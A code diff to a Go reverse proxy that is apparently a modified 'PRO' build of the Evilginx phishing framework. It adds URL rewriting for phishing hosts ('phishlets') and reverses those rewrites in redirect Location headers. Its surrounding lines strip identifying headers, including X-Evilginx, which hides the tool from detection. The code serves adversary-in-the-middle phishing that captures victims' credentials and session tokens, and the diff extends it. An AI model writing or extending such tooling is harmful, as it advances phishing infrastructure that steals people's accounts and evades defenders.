@@ -164,6 +164,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		resp.Header.Del("Server")
 		resp.Header.Del("X-Powered-By")
 		resp.Header.Del("X-Evilginx")
+
+		// PRO 4.2: URL Rewriting (Response - 3xx Redirects)
+		loc := resp.Header.Get("Location")
+		if loc != "" && resp.Request != nil {
+			// Try to find the phishlet from the request host
+			// Note: resp.Request.Host should still be the phish domain if goproxy handles it correctly,
+			// or we can try to retrieve it from ctx.UserData if we link it properly.
+			// For now, let's try p.getPhishletByPhishHost using the request host.
+			
+			pl := p.getPhishletByPhishHost(resp.Request.Host)
+			if pl != nil {
+				u, err := url.Parse(loc)
+				if err == nil {
+					// Check if path needs un-rewriting
+					// We pass resp.Request.Host as the hostname because UnrewriteUrl expects the trigger domain
+					if orig_path, ok := pl.UnrewriteUrl(resp.Request.Host, u.Path); ok {
+						log.Debug("rewrite_url: reversing redirect %s -> %s", u.Path, orig_path)
+						u.Path = orig_path
+						resp.Header.Set("Location", u.String())
+					}
+				}
+			}
+		}
+
 		return resp
 	})
 
@@ -228,6 +252,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
+			
+			// PRO 4.2: URL Rewriting (Request)
+			if pl != nil {
+				if rw, ok := pl.GetRewriteUrl(req.Host, req.URL.Path); ok {
+					log.Debug("rewrite_url: matched trigger for %s %s", req.Host, req.URL.Path)
+					
+					// Apply rewrite logic
+					// Note: Session ID might not be available yet, so we pass empty string for now
+					// If {id} is needed in params, it will be replaced with empty string or we need early session extraction
+					new_path, new_params := rw.Apply(ps.SessionId, req.URL.Query())
+					
+					// Log the change
+					log.Debug("rewrite_url: rewriting %s -> %s", req.URL.Path, new_path)
+					
+					// Update Request
+					req.URL.Path = new_path
+					req.URL.RawQuery = new_params.Encode()
+					
+					// Update path variable for subsequent logic
+					req_path = req.URL.Path
+				}
+			}
+
 			remote_addr := from_ip
 
 			// Redundant early puppet check removed to prevent body consumption issues.
